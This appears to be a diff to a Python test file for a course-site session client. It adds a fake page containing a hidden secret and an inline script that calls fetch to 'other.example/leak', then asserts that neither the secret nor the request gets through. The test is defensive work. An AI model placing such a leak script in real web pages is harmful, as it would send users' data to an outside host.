@@ -95,7 +95,8 @@ def test_profile_symlink_is_not_opened(tmp_path):
 
 def test_user_initiated_synthetic_login_and_expiry(tmp_path):
     requests=[]; expired=[False]
-    page=b'<main>' + b'Course lecture and assignment information. '*12 + b'</main>'
+    page=(b'<main>' + b'Course lecture and assignment information. '*12 +
+          b'<span hidden>HiddenSessionSecret</span><script>fetch("https://other.example/leak")</script></main>')
     def transport(url, method, headers, body):
         requests.append((url,method))
         if method=='POST':
@@ -117,14 +118,16 @@ def test_user_initiated_synthetic_login_and_expiry(tmp_path):
         assert sum(method=='POST' for _,method in requests)==1
         result=session.call('verify')
         assert result['state']=='content_visible' and 'Course lecture' in result['content']
+        assert 'HiddenSessionSecret' not in result['content']
+        assert not any('other.example' in url for url,_ in requests)
         with pytest.raises(Conflict): session.call('confirm_content','wrong')
         result=session.call('verify')
         assert session.call('confirm_content',result['review_token'])['state']=='connected'
+        assert 'Course lecture' in session.call('analysis_snapshot')['content']
         expired[0]=True
         before=len(requests)
-        result=session.call('verify')
-        assert result['state'] in ('access_unverified','reconnect_needed')
-        assert 'content' not in result
+        with pytest.raises(Conflict): session.call('analysis_snapshot')
+        assert session.snapshot()['state'] in ('access_unverified','reconnect_needed')
         assert requests[before:]==[('https://course.example.edu/course','GET')]
     finally:
         if session.snapshot()['state'] not in ('closed','error'): session.call('cancel')
